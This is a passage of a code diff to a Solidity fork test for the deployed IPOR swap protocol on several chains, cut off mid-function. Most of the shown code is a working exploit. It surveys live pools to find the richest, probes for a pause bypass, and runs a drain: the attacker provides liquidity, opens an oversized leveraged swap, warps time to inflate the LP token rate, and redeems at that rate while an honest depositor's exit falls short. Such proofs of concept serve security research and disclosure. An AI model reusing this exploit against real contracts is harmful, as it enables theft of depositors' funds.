-            IRouter.provideLiquidityUsdcToAmmPoolUsdc.selector,
-            IRouter.provideLiquidityUsdc.selector,
-            IRouter.redeemFromAmmPoolUsdc.selector
-        ];
-        bytes4 miss = bytes4(keccak256("IPOR_012"));
-        for (uint256 i; i < sels.length; i++) {
-            (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sels[i]));
-            bytes4 got = ret.length >= 4 ? bytes4(ret) : bytes4(0);
-            console2.log("selector:");
-            console2.logBytes4(sels[i]);
-            if (!ok && got == miss) {
-                console2.log("  NOT dispatched by this router");
-            } else if (!ok) {
-                console2.log("  dispatched (reverted later)");
-            } else {
-                console2.log("  dispatched (returned)");
-            }
-            if (!ok && got != miss) _logReason(ret);
-        }
-    }
-
-    // ---------------------------------------------------------------- 2. attack
-    function test_1_attack() public {
-        Pool[] memory ps = _pools();
-        (uint256 idx,) = _pick(ps);
-
-        // optional TARGET override
-        try vm.envString("TARGET") returns (string memory t) {
-            for (uint256 i; i < ps.length; i++) {
-                if (keccak256(bytes(t)) == keccak256(bytes(ps[i].tag))) idx = i;
-            }
-        } catch {}
-
-        Pool memory p = ps[idx];
-        console2.log("target:", p.name);
-        console2.log("block", block.number);
-
-        (uint256 idle0, uint256 vault0) = _cash(p);
-        (uint256 depth0,) = _depth(p);
-        uint256 rate0 = _rate(p);
-        console2.log("depth0 (wad)", depth0);
-        console2.log("idle0  (wad)", idle0);
-        console2.log("vault0 (wad)", vault0);
-        console2.log("rate0", rate0);
-
-        // default: the attacker takes half the book, so his share of ipToken supply is
-        // large enough for the inflated rate to pay out real money (his LP capital is
-        // returned by the redemption, it is not a cost).
-        uint256 atkLpWad = _envOr("ATK_LP", depth0 / 2);
-        uint256 totalWad = _envOr("TOTAL", depth0 / 2);
-        uint256 lev = _envOr("LEV", 1000e18);
-        uint256 days_ = _envOr("DAYS", 90);
-        uint256 chunkCount = _envOr("CHUNKS", 20);
-        if (chunkCount == 0) chunkCount = 8;
-
-        console2.log("plan: LP in        ", atkLpWad);
-        console2.log("plan: swap total   ", totalWad);
-        console2.log("plan: leverage     ", lev);
-        console2.log("plan: elapsed days ", days_);
-
-        // risk indicators must be signed by IPOR's off-chain key. A fork cannot
-        // forge it, and in production ANY user obtains such a payload from the
-        // public IPOR API - it is not a privilege. Here we just point the
-        // verifier at a key we control (the only owner-gated step, test-only).
-        address owner = router.owner();
-        vm.prank(owner);
-        try router.setMessageSigner(signer) {} catch {
-            console2.log("!! setMessageSigner reverted");
-            revert("blocked: no risk-indicator signer");
-        }
-        console2.log("");
-        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
-        console2.log("     risk-indicator signature payload that any user can fetch.");
-        console2.log("");
-
-        // generous float, we only spend what the calls actually pull
-        deal(p.asset, attacker, _fromWad(2 * depth0, p.decimals) + 10 ** p.decimals);
-        uint256 float0 = IERC20Like(p.asset).balanceOf(attacker); // capital ceiling for accounting
-
-        uint256 spent;
-        uint256 ipBal;
-
-        vm.startPrank(attacker);
-        IERC20Like(p.asset).approve(address(router), type(uint256).max);
-
-        // ---- 1. become an LP (shrink if the pool is at its TVL cap)
-        uint256 lpWad = atkLpWad;
-        bool ok;
-        bytes memory ret;
-        for (uint256 i; i < 4; i++) {
-            uint256 amt = _fromWad(lpWad, p.decimals);
-            if (amt == 0) break;
-            string memory via;
-            (ok, ret, via) = _callPool(p.poolsService, abi.encodeWithSelector(_provideSel(p), attacker, amt));
-            if (ok) {
-                spent += amt;
-                console2.log("provided liquidity (wad)", lpWad);
-                console2.log("  via", via);
-                break;
-            }
-            console2.log("provideLiquidity failed at (wad):", lpWad);
-            _logReason(ret);
-            lpWad /= 2;
-        }
-        ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
-        if (ipBal == 0) {
-            vm.stopPrank();
-            revert("could not enter the pool as LP");
-        }
-        console2.log("ipTokens minted", ipBal);
-
-        // ---- 2. open an oversized receive-fixed swap.
-        //      Two arities exist on the router: V1 (beneficiary, inputAsset, ...) on
-        //      Arbitrum/Base USDC and legacy (beneficiary, ...) on Ethereum. Try the
-        //      chain's flavour first, then the other, halving the size on every miss.
-        uint256 swapTotalWad = totalWad;
-        uint256 swapId;
-        bool opened;
-        uint8 variantUsed;
-        for (uint256 i; i < 6; i++) {
-            if (swapTotalWad == 0) break;
-            RiskInputs memory ri = RiskInputs({
-                maxCollateralRatio: 0.90e18,
-                maxCollateralRatioPerLeg: 0.90e18,
-                maxLeveragePerLeg: lev,
-                baseSpreadPerLeg: 0.001e18,
-                fixedRateCapPerLeg: 0.05e18,
-                demandSpreadFactor: 280,
-                expiration: block.timestamp + 1 hours,
-                signature: ""
-            });
-            ri.signature = _sign(ri, p.asset, 2, 1); // tenor DAYS_90, PAY_FLOATING_RECEIVE_FIXED
-
-            uint256 amt = _fromWad(swapTotalWad, p.decimals);
-            for (uint8 v; v < 2; v++) {
-                (ok, ret) = address(router).call(_openCalldata(p, v, amt, lev, ri));
-                if (ok) {
-                    swapId = abi.decode(ret, (uint256));
-                    spent += amt;
-                    opened = true;
-                    variantUsed = v;
-                    console2.log("swap total used (wad)", swapTotalWad);
-                    console2.log("  calldata flavour", v);
-                    break;
-                }
-            }
-            if (opened) break;
-            console2.log("openSwap failed at total (wad):", swapTotalWad);
-            _logReason(ret);
-            swapTotalWad /= 2;
-        }
-        if (!opened) {
-            vm.stopPrank();
-            revert("could not open the oversized swap");
-        }
-        if (variantUsed != 0) console2.log("  (legacy arity accepted)");
-        vm.stopPrank();
-
-        console2.log("swapId", swapId);
-        console2.log("assets still on the EOA after swap", IERC20Like(p.asset).balanceOf(attacker));
-        console2.log("rate after swap", _rate(p));
-        (uint256 depthSwap,) = _depth(p);
-        console2.log("LP balance after swap (wad)", depthSwap);
-        if (p.ammStorage != address(0)) {
-            try IAmmStorageSwap(p.ammStorage).getSwap(1, swapId) returns (SwapData memory sw) {
-                console2.log("  swap.collateral (wad)", sw.collateral);
-                console2.log("  swap.notional   (wad)", sw.notional);
-                console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
-                console2.log("  swap.tenor", sw.tenor);
-            } catch {}
-        }
-
-        // time passes: ibt price accrues, SOAP goes negative, unclamped.
-        vm.warp(block.timestamp + days_ * 1 days);
-        uint256 rate1 = _rate(p);
-        (uint256 depth1,) = _depth(p);
-        uint256 supply1 = IERC20Like(p.ipToken).totalSupply();
-        uint256 fairRate = supply1 > 0 ? (depth1 * 1e18) / supply1 : 0;
-        console2.log("");
-        console2.log("== after elapsed days:");
-        console2.log("  rate1 (with the phantom mark)", rate1);
-        console2.log("  fair rate (LP balance / supply)", fairRate);
-        console2.log("  phantom inflation x1000", rate1 > fairRate ? ((rate1 - fairRate) * 1000) / fairRate : 0);
-        console2.log("  LP balance (real assets untouched)", depth1);
-        console2.log("  ipToken supply", supply1);
-
-        // redeem in chunks, shrinking the chunk when a transfer no longer fits
-        // into the treasury's liquid balance.
-        uint256 chunk = ipBal / chunkCount;
-        if (chunk == 0) chunk = 1;
-        uint256 attempts;
-        vm.startPrank(attacker);
-        while (ipBal > 0 && attempts < 40) {
-            attempts++;
-            uint256 c = chunk > ipBal ? ipBal : chunk;
-            (bool rok,,) = _callPool(p.poolsService, abi.encodeWithSelector(_redeemSel(p), attacker, c));
-            if (rok) {
-                ipBal -= c;
-            } else {
-                chunk /= 2;
-                if (chunk == 0) break;
-            }
-        }
-        vm.stopPrank();
-
-        // ---- 3. after the drain the swap cannot be settled any more; try it anyway.
-        uint256[] memory pf = new uint256[](0);
-        uint256[] memory rf = new uint256[](1);
-        rf[0] = swapId;
-        RiskInputs memory rc = RiskInputs({
+    function _risk(uint256 lev) internal view returns (RiskInputs memory ri) {
+        ri = RiskInputs({
             maxCollateralRatio: 0.90e18,
             maxCollateralRatioPerLeg: 0.90e18,
             maxLeveragePerLeg: lev,
@@ -690,40 +480,564 @@ contract IporForkTest is Test {
             expiration: block.timestamp + 1 hours,
             signature: ""
         });
-        rc.signature = _sign(rc, p.asset, 2, 1);
-        CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
-        bytes memory closeCall = p.kind == K_WSTETH
-            ? abi.encodeWithSelector(IRouterClose.closeSwapsWstEth.selector, attacker, pf, rf, cri)
-            : abi.encodeWithSelector(IRouterClose.closeSwapsUsdc.selector, attacker, pf, rf, cri);
-        vm.startPrank(attacker);
-        (bool cok, bytes memory cret) = address(router).call(closeCall);
-        vm.stopPrank();
+    }
 
+    /// @dev acceptableFixedInterestRate: 0 for receive-fixed (no floor needed),
+    ///      100% for pay-fixed (the service requires acceptable > 0 and >= offered)
+    function _openCalldata(
+        Pool memory p,
+        uint256 tenorIdx,
+        bool withInputAsset,
+        uint256 dir,
+        uint256 amt,
+        uint256 lev,
+        RiskInputs memory ri
+    ) internal view returns (bytes memory) {
+        bytes4 sel = _openSel(p.assetTag, tenorIdx, withInputAsset, dir);
+        uint256 acceptable = dir == DIR_RECEIVE_FIXED ? 0 : 1e18;
+        if (withInputAsset) {
+            return abi.encodeWithSelector(sel, attacker, p.asset, amt, acceptable, lev, ri);
+        }
+        return abi.encodeWithSelector(sel, attacker, amt, acceptable, lev, ri);
+    }
+
+    function _pick(Pool[] memory ps) internal view returns (uint256 idx, uint256 bestUsd) {
+        for (uint256 i; i < ps.length; i++) {
+            (uint256 d,) = _depth(ps[i]);
+            uint256 usd = _usd(ps[i], d);
+            if (usd > bestUsd) {
+                bestUsd = usd;
+                idx = i;
+            }
+        }
+    }
+
+    function _target(Pool[] memory ps) internal view returns (uint256 idx) {
+        (idx,) = _pick(ps);
+        (string memory t, bool ok) = _envS("TARGET");
+        if (ok) {
+            for (uint256 i; i < ps.length; i++) {
+                if (keccak256(bytes(t)) == keccak256(bytes(ps[i].tag))) idx = i;
+            }
+        }
+    }
+
+    // ============================================================ 0. recon
+    function test_0_recon() public {
+        Pool[] memory ps = _pools();
+        console2.log("chain", block.chainid, "block", block.number);
+        console2.log("router", address(router));
+        console2.log("owner", router.owner());
+        console2.log("");
+        for (uint256 i; i < ps.length; i++) {
+            Pool memory p = ps[i];
+            (uint256 idle, uint256 vault) = _cash(p);
+            (uint256 d, string memory src) = _depth(p);
+            uint256 supply = IERC20Like(p.ipToken).totalSupply();
+            uint256 rate = _rate(p);
+            console2.log("--------------------------------------------------");
+            console2.log(p.name);
+            console2.log("  asset           ", p.asset);
+            console2.log("  ipToken         ", p.ipToken);
+            console2.log("  treasury        ", p.treasury);
+            console2.log("  treasury idle (wad)", idle);
+            console2.log("  asset mgr     (wad)", vault);
+            console2.log("  LP balance    (wad)", d);
+            console2.log("  depth source        ", src);
+            console2.log("  ipToken supply (wad)", supply);
+            console2.log("  exchange rate (wad)", rate);
+            console2.log("  LP balance USD      ", _usd(p, d));
+            console2.log("  redeemable USD      ", _usd(p, idle + vault));
+            // what can be opened right now?
+            for (uint256 t; t < 3; t++) {
+                bool pausedRF = _isPaused(_openSel(p.assetTag, t, true, DIR_RECEIVE_FIXED)) &&
+                    _isPaused(_openSel(p.assetTag, t, false, DIR_RECEIVE_FIXED));
+                bool pausedPF = _isPaused(_openSel(p.assetTag, t, true, DIR_PAY_FIXED)) &&
+                    _isPaused(_openSel(p.assetTag, t, false, DIR_PAY_FIXED));
+                console2.log(
+                    string.concat(
+                        "  ",
+                        _tenorTag(t),
+                        "  receiveFixed paused? ",
+                        pausedRF ? "YES" : "no",
+                        "   payFixed paused? ",
+                        pausedPF ? "YES" : "no"
+                    )
+                );
+            }
+            console2.log("  provideLiquidity paused?", _isPaused(_provideSel(p)) ? "YES" : "no");
+            console2.log("  redeemFromPool paused?  ", _isPaused(_redeemSel(p)) ? "YES" : "no");
+        }
+    }
+
+    // ============================================================ 2. selector probe
+    function test_2_probe() public {
+        _pools();
+        // fail fast if a signature string above is malformed
+        assertEq(_openSel("Usdc", 2, true, DIR_RECEIVE_FIXED), bytes4(0x3696578d), "usdc 90d receiveFixed selector");
+        assertEq(_openSel("WstEth", 2, true, DIR_RECEIVE_FIXED), bytes4(0x1253b3ae), "wsteth 90d receiveFixed selector");
+        assertEq(_openSel("Usdc", 2, true, DIR_PAY_FIXED), bytes4(0x5753d5bf), "usdc 90d payFixed selector");
+        assertEq(_openSel("Usdc", 0, true, DIR_RECEIVE_FIXED), bytes4(0x905a44e4), "usdc 28d receiveFixed selector");
+        assertEq(_provideSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), 0, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0x87b3c417), "provide V1 selector");
+
+        bytes4[10] memory sels = [
+            _openSel("Usdc", 2, true, DIR_RECEIVE_FIXED),
+            _openSel("Usdc", 2, false, DIR_RECEIVE_FIXED),
+            _openSel("Usdc", 2, true, DIR_PAY_FIXED),
+            _openSel("WstEth", 2, true, DIR_RECEIVE_FIXED),
+            _openSel("Usdc", 1, true, DIR_RECEIVE_FIXED),
+            _openSel("Usdc", 0, true, DIR_RECEIVE_FIXED),
+            _redeemSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), 0, 6, LP_USDC_V1, address(0), address(0), address(0))),
+            IRouter.closeSwapsUsdc.selector,
+            IRouter.closeSwapsWstEth.selector,
+            IRouter.provideLiquidityUsdc.selector
+        ];
+        bytes4 miss = bytes4(keccak256("IPOR_012"));
+        for (uint256 i; i < sels.length; i++) {
+            console2.log("selector:");
+            console2.logBytes4(sels[i]);
+            console2.log("  paused", _isPaused(sels[i]) ? "YES" : "no");
+            (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sels[i]));
+            bytes4 got = ret.length >= 4 ? bytes4(ret) : bytes4(0);
+            if (!ok && got == miss) {
+                console2.log("  NOT dispatched by this router");
+            } else if (!ok) {
+                console2.log("  dispatched (reverted later)");
+                _logReason(ret);
+            } else {
+                console2.log("  dispatched (returned)");
+            }
+        }
+    }
+
+    // ============================================================ 3. pause map
+    /// @notice prints the pause state of every open/liquidity/close entry point
+    ///         and proves the pause cannot be bypassed through the raw service.
+    function test_3_pause() public {
+        Pool[] memory ps = _pools();
+        console2.log("chain", block.chainid, "router", address(router));
+        console2.log("");
+
+        string[4] memory tags = ["Usdc", "WstEth", "Usdt", "Dai"];
+        string[2] memory dirs = ["ReceiveFixed", "PayFixed"];
+        for (uint256 a; a < tags.length; a++) {
+            for (uint256 d; d < 2; d++) {
+                for (uint256 t; t < 3; t++) {
+                    uint256 dir = d == 0 ? DIR_RECEIVE_FIXED : DIR_PAY_FIXED;
+                    bytes4 s6 = _openSel(tags[a], t, true, dir);
+                    bytes4 s5 = _openSel(tags[a], t, false, dir);
+                    bool p6 = _isPaused(s6);
+                    bool p5 = _isPaused(s5);
+                    console2.log(
+                        string.concat(
+                            "openSwap",
+                            dirs[d],
+                            _tenorTag(t),
+                            tags[a],
+                            "  6arg ",
+                            p6 ? "PAUSED" : "open  ",
+                            "   5arg ",
+                            p5 ? "PAUSED" : "open  "
+                        )
+                    );
+                    console2.logBytes4(s6);
+                    console2.logBytes4(s5);
+                }
+            }
+        }
+
+        console2.log("");
+        console2.log("liquidity / close entry points of the pools under test:");
+        for (uint256 i; i < ps.length; i++) {
+            console2.log(ps[i].name);
+            console2.log("   provide paused", _isPaused(_provideSel(ps[i])) ? "YES" : "no");
+            console2.log("   redeem  paused", _isPaused(_redeemSel(ps[i])) ? "YES" : "no");
+        }
+        console2.log("   closeSwapsUsdc paused  ", _isPaused(IRouter.closeSwapsUsdc.selector) ? "YES" : "no");
+        console2.log("   closeSwapsWstEth paused", _isPaused(IRouter.closeSwapsWstEth.selector) ? "YES" : "no");
+
+        // ---- pause bypass attempt: call the open-swap service directly.
+        // The router delegatecalls the service, so the message-signer slot it
+        // reads lives in router storage; in the service's own storage it is 0.
+        console2.log("");
+        console2.log("== pause bypass via the raw service contract");
+        Pool memory p = ps[0];
+        if (p.openSwapService != address(0)) {
+            address owner = router.owner();
+            uint256 lev = 10e18;
+            RiskInputs memory ri = _risk(lev);
+            ri.signature = _sign(ri, p.asset, 2, DIR_RECEIVE_FIXED);
+            deal(p.asset, attacker, _fromWad(100e18, p.decimals) + 10 ** p.decimals);
+            vm.startPrank(attacker);
+            IERC20Like(p.asset).approve(address(router), type(uint256).max);
+            IERC20Like(p.asset).approve(p.openSwapService, type(uint256).max);
+            (bool ok, bytes memory ret) = p.openSwapService.call(
+                abi.encodeWithSelector(IOpenSwapDirect.openSwapReceiveFixed90daysUsdc.selector, attacker, p.asset, _fromWad(100e18, p.decimals), 0, lev, ri)
+            );
+            vm.stopPrank();
+            if (ok) {
+                console2.log("   ACCEPTED -> pause bypassed, finding is live");
+            } else {
+                console2.log("   rejected, as the service's own signer slot is empty");
+                _logReason(ret);
+            }
+            // same call, but with the signer the router uses - still must fail
+            // because the slot being read is the service's, not the router's.
+            console2.log("   (router signer is set:", owner, ")");
+        }
+    }
+
+    // ============================================================ 4. every chain
+    /// @notice one run, all three deployments: how big is each pool and which
+    ///         entry points are still open. skips a chain whose RPC is not set.
+    function test_4_all_chains() public {
+        _chainProbe("arbitrum", "ARB_RPC");
+        _chainProbe("ethereum", "ETH_RPC");
+        _chainProbe("base", "BASE_RPC");
+    }
+
+    function _chainProbe(string memory name, string memory key) internal {
+        (string memory rpc, bool ok) = _envS(key);
+        if (!ok) {
+            console2.log(string.concat(name, ": ", key, " not set, skipped"));
+            return;
+        }
+        vm.createSelectFork(rpc);
+        Pool[] memory ps = _pools();
+        console2.log("");
+        console2.log(string.concat("===== ", name));
+        console2.log("chainid", block.chainid, "block", block.number);
+        console2.log("router", address(router));
+        address ownerSr = address(0);
+        try router.owner() returns (address o) {
+            ownerSr = o;
+        } catch {
+            console2.log("  !! router.owner() reverted - is this address still the router?");
+        }
+        console2.log("owner ", ownerSr);
+        for (uint256 i; i < ps.length; i++) {
+            Pool memory p = ps[i];
+            (uint256 idle, uint256 vault) = _cash(p);
+            (uint256 d,) = _depth(p);
+            console2.log(p.name);
+            console2.log("  LP balance (wad)", d);
+            console2.log("  LP balance USD  ", _usd(p, d));
+            console2.log("  cash idle (wad) ", idle);
+            console2.log("  cash vault (wad)", vault);
+            for (uint256 t; t < 3; t++) {
+                bytes4 rf = _openSel(p.assetTag, t, true, DIR_RECEIVE_FIXED);
+                bytes4 pf = _openSel(p.assetTag, t, true, DIR_PAY_FIXED);
+                console2.log(
+                    string.concat(
+                        "  ",
+                        _tenorTag(t),
+                        "  receiveFixed ",
+                        _isPaused(rf) ? "PAUSED" : "OPEN",
+                        "   payFixed ",
+                        _isPaused(pf) ? "PAUSED" : "OPEN"
+                    )
+                );
+            }
+            console2.log("  provideLiquidity", _isPaused(_provideSel(p)) ? "PAUSED" : "OPEN");
+            console2.log("  redeem          ", _isPaused(_redeemSel(p)) ? "PAUSED" : "OPEN");
+        }
+    }
+
+    // ============================================================ 1. attack
+    function test_1_attack() public {
+        Pool[] memory ps = _pools();
+        Pool memory p = ps[_target(ps)];
+
+        console2.log("target:", p.name);
+        console2.log("block", block.number);
+
+        (uint256 idle0, uint256 vault0) = _cash(p);
+        (uint256 depth0, string memory depthSrc) = _depth(p);
+        uint256 rate0 = _rate(p);
+        uint256 supply0 = IERC20Like(p.ipToken).totalSupply();
+        console2.log("depth0 (wad)", depth0);
+        console2.log("  depth source", depthSrc);
+        console2.log("  depth0 USD  ", _usd(p, depth0));
+        console2.log("idle0  (wad)", idle0);
+        console2.log("vault0 (wad)", vault0);
+        console2.log("ipToken supply", supply0);
+        console2.log("rate0", rate0);
+
+        uint256 atkLpWad = _envOr("ATK_LP", depth0 / 2);
+        uint256 honestWad = _envOr("HONEST", depth0 / 4);
+        uint256 totalWad = _envOr("TOTAL", depth0 / 2);
+        uint256 lev = _envOr("LEV", 1000e18);
+        uint256 wantTenor = _envOr("TENOR", 90);
+        uint256 chunkCount = _envOr("CHUNKS", 20);
+        if (chunkCount == 0) chunkCount = 20;
+
+        uint256 tenorIdx = wantTenor >= 90 ? 2 : (wantTenor >= 60 ? 1 : 0);
+        uint256 days_ = _envOr("DAYS", wantTenor);
+        if (days_ == 0) days_ = 90;
+
+        console2.log("plan: LP in (attacker)", atkLpWad);
+        console2.log("plan: LP in (honest)  ", honestWad);
+        console2.log("plan: swap collateral ", totalWad);
+        console2.log("plan: leverage        ", lev);
+        console2.log("plan: tenor (days)    ", _tenorTag(tenorIdx));
+        console2.log("plan: days held       ", days_);
+        console2.log("");
+
+        // ---- test-only: point the risk-indicator verifier at our key
+        address owner = router.owner();
+        vm.prank(owner);
+        try router.setMessageSigner(signer) {} catch {
+            console2.log("!! setMessageSigner reverted");
+            revert("blocked: no risk-indicator signer");
+        }
+        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
+        console2.log("     risk-indicator payload any user can fetch from IPOR's API.");
+        console2.log("");
+
+        // ---- fund: exactly what the plan needs, so that
+        //      net = balanceOf(attacker) - float0 is a real profit, not an
+        //      artefact of an over-funding deal().
+        uint256 atkBudgetWad = atkLpWad + totalWad + totalWad / 20 + depth0 / 100 + 1e18;
+        deal(p.asset, attacker, _fromWad(atkBudgetWad, p.decimals) + 10 ** p.decimals);
+        deal(p.asset, honest, _fromWad(honestWad, p.decimals) + 10 ** p.decimals);
+        uint256 float0 = IERC20Like(p.asset).balanceOf(attacker);
+        uint256 honestFloat0 = IERC20Like(p.asset).balanceOf(honest);
+        console2.log("attacker float (wad)", _wad(float0, p.decimals));
+        console2.log("honest   float (wad)", _wad(honestFloat0, p.decimals));
+
+        uint256 spent;
+
+        // ---- 1. honest LP joins first (the victim)
+        uint256 honestIp;
+        if (honestWad > 0) {
+            vm.startPrank(honest);
+            IERC20Like(p.asset).approve(address(router), type(uint256).max);
+            (bool hok, bytes memory hret) = address(router).call(
+                abi.encodeWithSelector(_provideSel(p), honest, _fromWad(honestWad, p.decimals))
+            );
+            vm.stopPrank();
+            if (hok) {
+                honestIp = IERC20Like(p.ipToken).balanceOf(honest);
+                console2.log("honest ipTokens", honestIp);
+            } else {
+                console2.log("honest LP entry failed");
+                _logReason(hret);
+            }
+        }
+
+        // ---- 2. attacker becomes an LP
+        uint256 atkLp = atkLpWad;
+        uint256 ipBal;
+        for (uint256 i; i < 4; i++) {
+            uint256 amt = _fromWad(atkLp, p.decimals);
+            if (amt == 0) break;
+            vm.startPrank(attacker);
+            IERC20Like(p.asset).approve(address(router), type(uint256).max);
+            (bool ok, bytes memory ret) = address(router).call(
+                abi.encodeWithSelector(_provideSel(p), attacker, amt)
+            );
+            vm.stopPrank();
+            if (ok) {
+                spent += amt;
+                console2.log("attacker provided liquidity (wad)", atkLp);
+                break;
+            }
+            console2.log("provideLiquidity failed at (wad):", atkLp);
+            _logReason(ret);
+            atkLp /= 2;
+        }
+        ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
+        if (ipBal == 0) revert("could not enter the pool as LP");
+        console2.log("attacker ipTokens", ipBal);
+        console2.log("rate after LP entries", _rate(p));
+
+        // ---- 3. open one oversized swap.
+        //      The AMM prices BOTH directions against the trader once the swap
+        //      is big enough (receive-fixed: index - demandSpread, pay-fixed:
+        //      index + demandSpread), so the phantom LP gain appears on either
+        //      side. Try receive-fixed first, then pay-fixed; within a direction
+        //      try the requested tenor, then the other two; within a tenor try the
+        //      chain's arity, then the legacy one. Paused entry points are skipped
+        //      up front so a pause shows up as an honest "no path" instead of a
+        //      pile of reverts.
+        uint256 swapId;
+        bool opened;
+        uint256 usedTenor = tenorIdx;
+        uint256 usedDir = DIR_RECEIVE_FIXED;
+        uint8[2] memory dirOrder = [DIR_RECEIVE_FIXED, DIR_PAY_FIXED];
+        for (uint256 di; di < 2 && !opened; di++) {
+            uint256 dir = dirOrder[di];
+            for (uint256 tr; tr < 3 && !opened; tr++) {
+                uint256 t = (tenorIdx + tr) % 3;
+                uint256 cand = totalWad;
+                for (uint256 shrink; shrink < 6 && !opened; shrink++) {
+                    if (cand == 0) break;
+                    RiskInputs memory ri = _risk(lev);
+                    ri.signature = _sign(ri, p.asset, t, dir);
+                    uint256 amt = _fromWad(cand, p.decimals);
+                    for (uint8 v; v < 2 && !opened; v++) {
+                        bool withInput = v == 0;
+                        bytes4 sel = _openSel(p.assetTag, t, withInput, dir);
+                        if (_isPaused(sel)) continue;
+                        vm.startPrank(attacker);
+                        (bool ok, bytes memory ret) = address(router).call(
+                            _openCalldata(p, t, withInput, dir, amt, lev, ri)
+                        );
+                        vm.stopPrank();
+                        if (ok) {
+                            swapId = abi.decode(ret, (uint256));
+                            spent += amt;
+                            opened = true;
+                            usedTenor = t;
+                            usedDir = dir;
+                            console2.log(
+                                string.concat(
+                                    "swap opened: ",
+                                    dir == DIR_RECEIVE_FIXED ? "receiveFixed" : "payFixed",
+                                    " ",
+                                    _tenorTag(t),
+                                    " ",
+                                    withInput ? "6arg" : "5arg"
+                                )
+                            );
+                            console2.log("  collateral used (wad)", cand);
+                            break;
+                        }
+                        console2.log("  open failed at (wad):", cand);
+                        console2.logBytes4(sel);
+                        _logReason(ret);
+                    }
+                    cand /= 2;
+                }
+            }
+        }
+        if (!opened) {
+            revert("no open path: every direction/tenor is paused or rejected on this chain");
+        }
+
+        console2.log("swapId", swapId);
+        console2.log("swap tenor used", _tenorTag(usedTenor));
+        console2.log("rate after swap", _rate(p));
+        (uint256 depthSwap,) = _depth(p);
+        console2.log("LP balance after swap (wad)", depthSwap);
+        if (p.ammStorage != address(0)) {
+            try IAmmStorageSwap(p.ammStorage).getSwap(uint8(usedDir), swapId) returns (SwapData memory sw) {
+                console2.log("  swap.collateral (wad)", sw.collateral);
+                console2.log("  swap.notional   (wad)", sw.notional);
+                console2.log("  swap.ibtQty     (wad)", sw.ibtQuantity);
+                console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
+            } catch {}
+        }
+
+        // ---- 4. time passes: ibt price accrues, SOAP goes negative, unclamped
+        vm.warp(block.timestamp + days_ * 1 days);
+        uint256 rate1 = _rate(p);
+        (uint256 depth1,) = _depth(p);
+        uint256 supply1 = IERC20Like(p.ipToken).totalSupply();
+        uint256 fairRate = supply1 > 0 ? (depth1 * 1e18) / supply1 : 0;
+        console2.log("");
+        console2.log("== after days held:", days_);
+        console2.log("  rate1                        ", rate1);
+        console2.log("  rate1/rate0 (x1e18)          ", rate0 == 0 ? 0 : (rate1 * 1e18) / rate0);
+        console2.log("  fair rate (LP balance/supply)", fairRate);
+        console2.log("  phantom inflation x1000      ", fairRate == 0 ? 0 : ((rate1 > fairRate ? rate1 - fairRate : 0) * 1000) / fairRate);
+        console2.log("  LP balance (wad)             ", depth1);
+        console2.log("  ipToken supply               ", supply1);
+
+        // ---- 5. attacker redeems at the inflated price
+        vm.startPrank(attacker);
+        uint256 chunk = ipBal / chunkCount;
+        if (chunk == 0) chunk = 1;
+        uint256 attempts;
+        while (ipBal > 0 && attempts < 40) {
+            attempts++;
+            uint256 c = chunk > ipBal ? ipBal : chunk;
+            (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), attacker, c));
+            if (rok) {
+                ipBal -= c;
+            } else {
+                chunk /= 2;
+                if (chunk == 0) break;
+            }
+        }
+        vm.stopPrank();
+        uint256 atkAsset = IERC20Like(p.asset).balanceOf(attacker);
+        console2.log("");
+        console2.log("== attacker redemption");
+        console2.log("  ipTokens left", ipBal);
+        console2.log("  assets after redemption (wad)", _wad(atkAsset, p.decimals));
+        console2.log("  rate after redemption", _rate(p));
+
+        // ---- 6. the honest LP tries to leave the pool
+        uint256 honestClaim;
+        uint256 honestGot;
+        if (honestIp > 0) {
+            uint256 rateNow = _rate(p);
+            honestClaim = (honestIp * rateNow) / 1e18;
+            uint256 before = IERC20Like(p.asset).balanceOf(honest);
+            uint256 hLeft = honestIp;
+            uint256 hChunk = hLeft / chunkCount;
+            if (hChunk == 0) hChunk = 1;
+            uint256 hAttempts;
+            vm.startPrank(honest);
+            while (hLeft > 0 && hAttempts < 40) {
+                hAttempts++;
+                uint256 c = hChunk > hLeft ? hLeft : hChunk;
+                (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), honest, c));
+                if (rok) {
+                    hLeft -= c;
+                } else {
+                    hChunk /= 2;
+                    if (hChunk == 0) break;
+                }
+            }
+            vm.stopPrank();
+            honestGot = IERC20Like(p.asset).balanceOf(honest) - before;
+            console2.log("");
+            console2.log("== honest LP exit");
+            console2.log("  ipTokens redeemed    ", honestIp - hLeft);
+            console2.log("  ipTokens stuck       ", hLeft);
+            console2.log("  claim at rate (wad)  ", honestClaim);
+            console2.log("  actually received(wad)", _wad(honestGot, p.decimals));
+            console2.log("  claim USD            ", _usd(p, honestClaim));
+            console2.log("  received USD         ", _usd(p, _wad(honestGot, p.decimals)));
+        }
+
+        // ---- 7. the abandoned swap cannot be closed any more
+        uint256[] memory pf = new uint256[](usedDir == DIR_PAY_FIXED ? 1 : 0);
+        uint256[] memory rf = new uint256[](usedDir == DIR_RECEIVE_FIXED ? 1 : 0);
+        if (usedDir == DIR_PAY_FIXED) pf[0] = swapId;
+        else rf[0] = swapId;
+        RiskInputs memory rc = _risk(lev);
+        rc.signature = _sign(rc, p.asset, usedTenor, usedDir);
+        CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
+        bytes4 closeSel = p.kind == K_WSTETH ? IRouter.closeSwapsWstEth.selector : IRouter.closeSwapsUsdc.selector;
+        vm.startPrank(attacker);
+        (bool cok, bytes memory cret) = address(router).call(abi.encodeWithSelector(closeSel, attacker, pf, rf, cri));
+        vm.stopPrank();
         uint256 left = IERC20Like(p.asset).balanceOf(attacker);
         console2.log("");
         console2.log("== close attempt after the drain");
         if (cok) {
-            console2.log("  close SUCCEEDED, collateral recovered");
+            console2.log("  close SUCCEEDED: collateral recovered (wad)", _wad(left, p.decimals));
